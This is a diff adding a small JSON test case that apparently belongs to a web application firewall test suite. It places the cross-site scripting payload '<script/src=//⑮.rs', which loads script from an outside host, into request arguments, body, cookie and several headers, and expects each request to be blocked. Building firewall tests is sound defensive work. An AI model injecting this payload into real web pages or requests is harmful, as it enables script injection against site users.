@@ -1,0 +1,14 @@
+{
+  "payload": [
+    {
+      "ARGS": "<script/src=//⑮.rs",
+      "BODY": "<script/src=//⑮.rs",
+      "COOKIE": "<script/src=//⑮.rs",
+      "USER-AGENT": "<script/src=//⑮.rs",
+      "REFERER": "<script/src=//⑮.rs",
+      "HEADER": "<script/src=//⑮.rs",
+      "ENCODE": "Base64",
+      "BLOCKED": true
+    }
+  ]
+}
